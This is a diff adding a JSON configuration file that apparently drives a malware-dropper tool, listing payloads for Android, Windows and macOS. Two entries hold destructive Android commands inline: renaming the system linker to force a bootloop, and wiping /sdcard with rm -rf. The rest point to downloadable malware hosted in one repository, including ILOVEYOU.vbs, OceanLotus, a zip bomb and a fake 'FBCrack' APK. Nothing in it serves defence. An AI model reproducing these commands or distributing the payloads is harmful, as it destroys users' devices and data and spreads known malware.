@@ -1,0 +1,165 @@
+{
+	"anvima": [
+		{
+			"name": "Bootloop",
+			"type": "code",
+			"output": "bootloop.sh",
+			"content": "su -c 'rename /system/bin/linker /system/bin/link_lunk'\n"
+		},
+		{
+			"name": "Data-Eater",
+			"type": "code",
+			"output": "data-eater.sh",
+			"content": "su -c rm -rf /sdcard/*\n"
+		},
+		{
+			"name": "Freeze",
+			"type": "url",
+			"output": "freeze.sh",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/freeze.sh"
+		},
+		{
+			"name": "Bomb-Zip",
+			"type": "url",
+			"output": "zipbomb.zip",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/42.zip"
+		},
+		{
+			"name": "Elite",
+			"type": "url",
+			"output": "elite.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/elite.apk"
+		},
+		{
+			"name": "Trash",
+			"type": "url",
+			"output": "trash.sh",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/trash.sh"
+		},
+		{
+			"name": "FBCrack 2K18",
+			"type": "url",
+			"output": "FBCR2K18.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/fbcr.apk"
+		},
+		{
+			"name": "Vi4a",
+			"type": "url",
+			"output": "vi4a.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/vi4a.apk"
+		},
+		{
+			"name": "Malum",
+			"type": "url",
+			"output": "Malum.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/Malum.apk"
+		},
+		{
+			"name": "TakeBeer",
+			"type": "url",
+			"output": "TakeBeer.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/TakeBeer.apk"
+		},
+		{
+			"name": "Mobile Legends: Adventure",
+			"type": "url",
+			"output": "Mobile_Legends_Adventure.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/Mobile_Legends_Adventure.apk"
+		},
+		{
+			"name": "Mobelejen",
+			"type": "url",
+			"output": "mobelejen.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/mobelejen.apk"
+		}
+	],
+	"winvima": [
+		{
+			"name": "R.I.P",
+			"type": "url",
+			"output": "RIP.bat",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/RIP.bat"
+		},
+		{
+			"name": "ILOVEYOU",
+			"type": "url",
+			"output": "ILOVEYOU.vbs",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/ILOVEYOU.vbs"
+		},
+		{
+			"name": "PCT",
+			"type": "url",
+			"output": "PCT.bat",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/PCT.bat"
+		},
+		{
+			"name": "Reg-Eater",
+			"type": "url",
+			"output": "regeater.bat",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/regeater.bat"
+		},
+		{
+			"name": "CMD",
+			"type": "url",
+			"output": "CMD.bat",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/cmd.bat"
+		},
+		{
+			"name": "Alay",
+			"type": "url",
+			"output": "alay.vbs",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/alay.vbs"
+		},
+		{
+			"name": "CapsLock",
+			"type": "url",
+			"output": "capslock.vbs",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/capslock.vbs"
+		},
+		{
+			"name": "KUIS",
+			"type": "url",
+			"output": "kuis.bat",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/kuis.bat"
+		},
+		{
+			"name": "KOCE",
+			"type": "url",
+			"output": "KOCE.bat",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/koce.bat"
+		},
+		{
+			"name": "Sleepy",
+			"type": "url",
+			"output": "sleepy.bat",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/sleepy.bat"
+		},
+		{
+			"name": "Ugly",
+			"type": "url",
+			"output": "ugly.bat",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/ugly.bat"
+		}
+	],
+	"macvima": [
+		{
+			"name": "Trinoids",
+			"type": "url",
+			"output": "trinoids.app",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/trinoids.app"
+		},
+		{
+			"name": "OceanLotus",
+			"type": "url",
+			"output": "OceanLotus.zip",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/OceanLotus.zip"
+		},
+		{
+			"name": "Nothing",
+			"type": "url",
+			"output": "nothing.app",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/nothing.app"
+		}
+	]
+		
+}
